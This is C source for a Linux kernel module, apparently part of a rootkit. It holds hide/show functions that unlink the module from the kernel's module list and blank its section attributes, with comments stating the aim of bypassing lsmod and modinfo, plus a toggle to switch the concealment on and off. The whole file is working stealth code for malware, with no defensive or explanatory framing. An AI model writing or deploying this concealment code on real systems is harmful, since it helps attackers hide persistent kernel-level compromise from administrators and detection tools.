#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/slab.h>

#include "module.h"

MODULE_LICENSE("GPL");

int module_hidden = 0;
static struct list_head* mod_list;
static struct module_sect_attrs* mod_attrs;

void hide(void) {
	/* mutex lock : concurrency control */
	while(!mutex_trylock(&module_mutex))
		cpu_relax();

	/* hooking to bypass lsmod */
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	
	/* hooking to bypass modinfo */
	mod_attrs = THIS_MODULE->sect_attrs;
	THIS_MODULE->sect_attrs = NULL;
	
	mutex_unlock(&module_mutex);

	module_hidden = 1;
}

void show(void) {
	while(!mutex_trylock(&module_mutex))
		cpu_relax();

	list_add(&THIS_MODULE->list, mod_list);
	THIS_MODULE->sect_attrs = mod_attrs;

	mutex_unlock(&module_mutex);

	module_hidden = 0;
}

void toggle_module_visible(int flag) {
	if (module_hidden == 0 && flag == 1)
		hide();
	else if (module_hidden == 1 && flag == 0)
		show();
}
